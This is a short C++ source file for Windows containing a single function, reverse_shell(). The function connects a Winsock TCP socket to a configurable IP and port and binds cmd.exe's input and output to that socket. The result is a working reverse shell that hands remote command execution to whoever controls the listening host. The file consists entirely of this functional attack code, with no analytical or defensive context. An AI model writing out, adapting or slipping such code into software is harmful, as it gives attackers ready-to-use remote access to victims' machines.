#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string>

// Need to link with Ws2_32.lib
#pragma comment(lib, "ws2_32")

std::string port("8080");
std::string ip("127.0.0.1");

bool reverse_shell()
{
    WSADATA wsaData; SOCKET s1;
    struct sockaddr_in R;
    STARTUPINFOW A;
    PROCESS_INFORMATION B;

	// Initialize Winsock
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return false;
		
	// Create a SOCKET for connecting to server
	s1 = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
	if (s1 == INVALID_SOCKET) {
		WSACleanup();
		return false;
	}
	
	// The sockaddr_in structure specifies the address family,
	// IP address, and port of the server to be connected to.
	R.sin_family = AF_INET;
	R.sin_port = htons(std::stoul(port, nullptr, 0));
	R.sin_addr.s_addr = inet_addr(ip.c_str());

	// Connect to server
	auto wsocket = connect(s1, (SOCKADDR*)&R, sizeof(R));
	if (wsocket == SOCKET_ERROR) {
		wsocket = closesocket(s1);
		WSACleanup();
		return false;
	}

	memset(&A, 0, sizeof(A));
	A.cb = sizeof(A);
	A.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
	A.hStdInput = A.hStdOutput = A.hStdError = (HANDLE)s1;
	CreateProcessW(L"cmd.exe", NULL, 0, 0, 1, 0, 0, 0, &A, &B);
	return true;
}